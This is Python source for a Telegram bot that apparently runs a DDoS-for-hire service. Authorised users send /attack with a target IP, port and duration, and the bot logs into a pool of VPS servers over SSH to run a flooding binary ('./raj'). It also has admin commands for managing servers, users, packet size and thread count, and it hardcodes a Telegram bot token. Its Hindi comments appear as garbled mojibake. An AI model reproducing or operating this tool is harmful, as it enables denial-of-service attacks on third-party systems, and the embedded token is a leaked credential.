import random
import subprocess
import threading
import paramiko
import telebot
import json
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

TOKEN = "7301744883:AAErpx4jMcE7gnlBFxua4upRbuxdckujKGo"  # ЁЯФе рдЕрдкрдирд╛ рдЯреЛрдХрди рдбрд╛рд▓
bot = telebot.TeleBot(TOKEN)

ADMIN_IDS = [7855020275]  # ЁЯФе рдпрд╣рд╛рдБ рдЕрдкрдиреЗ Admin IDs рдбрд╛рд▓реЗрдВ
CONFIG_FILE = "config.json"

# тЬЕ `config.json` рд╕реЗ VPS рдбрд┐рдЯреЗрд▓реНрд╕ рд▓реЛрдб рдХрд░реЛ
with open(CONFIG_FILE, "r") as file:
    config = json.load(file)

VPS_LIST = config["VPS_LIST"]
users = []  # ЁЯМН рдпреВрдЬрд╝рд░ рд▓рд┐рд╕реНрдЯ

def save_config():
    """Config рдХреЛ рд╕реЗрд╡ рдХрд░рддрд╛ рд╣реИ"""
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

def check_vps_status():
    """рд╕рднреА VPS рдХрд╛ рд╕реНрдЯреЗрдЯрд╕ рдЪреЗрдХ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдбрд╛рдЙрди VPS рдХреЗ рд▓рд┐рдП рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рди рднреЗрдЬрддрд╛ рд╣реИ"""
    status_list = []
    failed_vps_list = []
    for vps in VPS_LIST:
        ip, user, password = vps["ip"], vps["user"], vps["password"]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            ssh.close()
            status_list.append(f"ЁЯЯв `{ip}` **RUNNING** тЬЕ")
        except:
            status_list.append(f"ЁЯФ┤ `{ip}` **DOWN** тЭМ")
            failed_vps_list.append(ip)
    
    # рдЕрдЧрд░ рдХреЛрдИ VPS рдлреЗрд▓ рд╣реБрдЖ рд╣реЛ рддреЛ рдПрдбрдорд┐рди рдХреЛ рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рди рднреЗрдЬреЛ
    if failed_vps_list:
        failed_vps_message = "\n".join([f"ЁЯФ┤ `{ip}` **DOWN** тЭМ" for ip in failed_vps_list])
        for admin_id in ADMIN_IDS:
            bot.send_message(admin_id, f"ЁЯЪи **ALERT: Some VPS are DOWN!**\n{failed_vps_message}")
    
    return "\n".join(status_list)

@bot.message_handler(commands=['cvps'])
def handle_check_vps(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    bot.reply_to(message, "тП│ **VPS рд╕реНрдЯреЗрдЯрд╕ рдЪреЗрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ...**")
    status_message = check_vps_status()
    bot.reply_to(message, f"ЁЯУб **VPS STATUS:**\n{status_message}")

@bot.message_handler(commands=['avps'])
def add_vps(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "тЪая╕П **Usage:** /add_vps `<IP>` `<USER>` `<PASSWORD>`")
        return
    
    ip, user, password = command[1], command[2], command[3]
    VPS_LIST.append({"ip": ip, "user": user, "password": password})
    save_config()
    bot.reply_to(message, f"тЬЕ **VPS `{ip}` рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛!**")

@bot.message_handler(commands=['rvps'])
def remove_vps(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "тЪая╕П **Usage:** /remove_vps `<IP>`")
        return
    
    ip = command[1]
    global VPS_LIST
    VPS_LIST = [vps for vps in VPS_LIST if vps["ip"] != ip]
    config["VPS_LIST"] = VPS_LIST
    save_config()
    bot.reply_to(message, f"тЬЕ **VPS `{ip}` рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛!**")


def get_available_vps():
    """рдЦрд╛рд▓реА VPS рдЪреБрдирддрд╛ рд╣реИ"""
    available_vps = [vps for vps in VPS_LIST if not vps["busy"]]
    return random.choice(available_vps) if available_vps else None

def execute_attack(vps, target, port, duration, chat_id):
    """VPS рдкрд░ рдЕрдЯреИрдХ рд░рди рдХрд░рддрд╛ рд╣реИ"""
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    attack_command = f"./raj {target} {port} {duration} 9 1200"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password)

        stdin, stdout, stderr = ssh.exec_command(attack_command)
        output, error = stdout.read().decode(), stderr.read().decode()

        ssh.close()
        vps["busy"] = False  # тЬЕ рдЕрдЯреИрдХ рдХреЗ рдмрд╛рдж VPS рдлреНрд░реА рдХрд░ рджреЛ

        if error:
            bot.send_message(chat_id, f"тЭМ **ЁЭРАЁЭРУЁЭРУЁЭРАЁЭРВЁЭРК ЁЭРЕЁЭРАЁЭРИЁЭРЛЁЭРДЁЭРГ ЁЭРЕЁЭРСЁЭРОЁЭРМ `{ip}`** ЁЯШб")
        else:
            bot.send_message(chat_id, f"тЬЕ **ЁЭРАЁЭРУЁЭРУЁЭРАЁЭРВЁЭРК ЁЭРВЁЭРОЁЭРМЁЭРПЁЭРЛЁЭРДЁЭРУЁЭРДЁЭРГ ЁЭРЕЁЭРСЁЭРОЁЭРМ `{ip}`** ЁЯТАЁЯФе")
    except Exception as e:
        vps["busy"] = False
        bot.send_message(chat_id, f"тЭМ **ЁЭРДЁЭРСЁЭРСЁЭРОЁЭРС:** {str(e)}")
def main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton('/attack'), KeyboardButton('/vps'))
    markup.add(KeyboardButton('/add'), KeyboardButton('/remove'))
    markup.add(KeyboardButton('/users'))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "ЁЯЪА **ЁЭШ╛ЁЭЩЭЁЭЩЦЁЭЩеЁЭЩзЁЭЩЮ ЁЭШ╝ЁЭЩйЁЭЩйЁЭЩЦЁЭЩШЁЭЩа ЁЭШ╜ЁЭЩдЁЭЩй** рддреИрдпрд╛рд░ рд╣реИ! ЁЯФе", reply_markup=main_menu())

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if message.from_user.id not in users:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "тЪая╕П **Usage:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port, time_duration = int(port), int(time_duration)
    except ValueError:
        bot.reply_to(message, "тЭМ **ЁЭРДЁЭРСЁЭРСЁЭРОЁЭРС:** ЁЭРПЁЭРОЁЭРСЁЭРУ ЁЭРАЁЭРНЁЭРГ ЁЭРУЁЭРИЁЭРМЁЭРД ЁЭРМЁЭРФЁЭРТЁЭРУ ЁЭРБЁЭРД ЁЭРИЁЭРНЁЭРУЁЭРДЁЭРЖЁЭРДЁЭРСЁЭРТ!")
        return

    if time_duration > 240:
        bot.reply_to(message, "ЁЯЪл **ЁЭРМЁЭРАЁЭРЧ ЁЭРГЁЭРФЁЭРСЁЭРАЁЭРУЁЭРИЁЭРОЁЭРН = 120ЁЭРм!**")
        return

    selected_vps = get_available_vps()
    if not selected_vps:
        bot.reply_to(message, "ЁЯЪл **рд╕рднреА VPS рдмрд┐рдЬреА рд╣реИрдВ, рдмрд╛рдж рдореЗрдВ рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ!**")
        return

    selected_vps["busy"] = True  # тЬЕ VPS рдХреЛ рдмрд┐рдЬреА рдорд╛рд░реНрдХ рдХрд░ рджреЛ
    bot.reply_to(message, f"ЁЯФе **Attack started from `{selected_vps['ip']}` on `{target}:{port}` for `{time_duration}`s** ЁЯЪА")

    attack_thread = threading.Thread(target=execute_attack, args=(selected_vps, target, port, time_duration, message.chat.id))
    attack_thread.start()  # тЬЕ рдЕрдЯреИрдХ рдХреЛ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдореЗрдВ рдЪрд▓рд╛рдУ

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "тЪая╕П **Usage:** /add_user `<USER_ID>`")
        return
    
    user_id = int(command[1])
    if user_id not in users:
        users.append(user_id)
        bot.reply_to(message, f"тЬЕ **User `{user_id}` added successfully!**")
    else:
        bot.reply_to(message, "тЪая╕П **User рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИ!**")
        
@bot.message_handler(commands=['packet'])
def set_packet_size(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    command = message.text.split()
    if len(command) != 2 or not command[1].isdigit():
        bot.reply_to(message, "тЪая╕П **Usage:** /set_packet_size `<SIZE>`")
        return
    
    global PACKET_SIZE
    PACKET_SIZE = int(command[1])
    config["PACKET_SIZE"] = PACKET_SIZE
    save_config()
    bot.reply_to(message, f"тЬЕ **Packet Size рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛: `{PACKET_SIZE}`**")


@bot.message_handler(commands=['set'])
def set_threads(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    command = message.text.split()
    if len(command) != 2 or not command[1].isdigit():
        bot.reply_to(message, "тЪая╕П **Usage:** /set_threads `<NUMBER>`")
        return
    
    global THREADS
    THREADS = int(command[1])
    config["THREADS"] = THREADS
    save_config()
    bot.reply_to(message, f"тЬЕ **Threads рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛: `{THREADS}`**")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "тЪая╕П **Usage:** /remove_user `<USER_ID>`")
        return
    
    user_id = int(command[1])
    if user_id in users:
        users.remove(user_id)
        bot.reply_to(message, f"тЬЕ **User `{user_id}` removed successfully!**")
    else:
        bot.reply_to(message, "тЪая╕П **User рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ!**")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "ЁЯЪл **рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ!**")
        return
    
    if not users:
        bot.reply_to(message, "тЪая╕П **рдХреЛрдИ рднреА рдпреВрдЬрд╝рд░ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ!**")
        return
    
    bot.reply_to(message, "ЁЯСе **Registered Users:**\n" + "\n".join(map(str, users)))

print("ЁЯЪА Bot is running...")
bot.polling()






